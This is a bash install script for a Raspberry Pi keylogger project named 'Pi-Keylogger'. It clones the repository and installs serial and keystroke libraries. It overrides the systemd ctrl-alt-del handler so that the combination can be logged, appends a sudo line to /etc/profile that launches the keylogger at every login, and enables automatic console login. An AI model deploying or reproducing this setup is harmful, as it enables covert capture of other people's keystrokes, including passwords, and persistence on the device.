#!/bin/bash
echo "Installing git and pip"
apt install git pip -y # Installing git for next step and pip for python libraries

echo "Downloading and extracting repository"
git clone https://github.com/apacelus/Pi-Keylogger --branch=master /home/pi/Pi-Keylogger # Cloning the repository to a new directory

echo "Creating log directory"
mkdir /home/pi/Pi-Keylogger/log # Creating log directory

echo "Downloading additional python libraries"
pip download getch pyserial

echo "Installing additional python libraries"
pip install ./getch* ./pyserial*

echo "Replacing cad service"
cp -f /home/pi/Pi-Keylogger/handlecad.service /etc/systemd/system/ # Overwriting default system handler to be able to keylog the "ctrl+alt+delete" combination.
cp -f /home/pi/Pi-Keylogger/ctrl-alt-del.target /lib/systemd/system/ # Not sure yet what this is for
systemctl daemon-reload # Reload systemd manager configuration

echo "Enabling auto-execution of the script"
echo "" >> /etc/profile # Adding empty line, exactly like this because other ways fail
echo "sudo python3 /home/pi/Pi-Keylogger/pi-keylogger.py" >> /etc/profile # Configuring file to autorun the pi-keylogger script on login.

echo "Enabling auto-login to cli"
# Using code from the raspi-config script(https://github.com/RPi-Distro/raspi-config) to autologin to cli on startup
systemctl set-default multi-user.target
ln -fs /lib/systemd/system/getty@.service /etc/systemd/system/getty.target.wants/getty@tty1.service
cat > /etc/systemd/system/getty@tty1.service.d/autologin.conf << EOF
[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin $USER --noclear %I \$TERM
EOF

echo "Please restart the system"
